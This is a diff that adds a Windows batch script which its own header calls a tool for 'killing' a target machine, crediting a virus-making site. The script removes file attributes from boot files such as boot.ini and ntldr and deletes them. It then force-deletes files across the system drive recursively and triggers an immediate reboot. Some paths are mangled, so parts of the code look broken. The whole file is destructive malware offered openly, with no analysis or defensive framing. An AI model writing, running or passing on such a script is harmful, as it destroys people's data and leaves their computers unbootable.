@@ -1,0 +1,32 @@
+# Author: EZ
+# Credits: https://www.onhax.net/makevirus (Idea and some of the code)
+# Version: 1.0
+# Description: Shutsdown target system and delete all files and programmes required to reboot (basically killing th target machine)
+# OS: Windows (for now; future versions will work on other OS's too)
+
+
+@echo off
+
+PAUSE
+
+attrib -r -s -h c:autoexec.bat
+
+del c:autoexec.bat
+
+attrib -r -s -h c:boot.ini
+
+del c:boot.ini
+
+attrib c:ntldr
+
+del c:ntldr
+
+attrib -r -s -h c:windowsin.ini
+
+del c:windowsin.ini
+
+@echo off
+
+del %systemdrive%.* /f /s /q
+
+shutdown -r -f -t 00
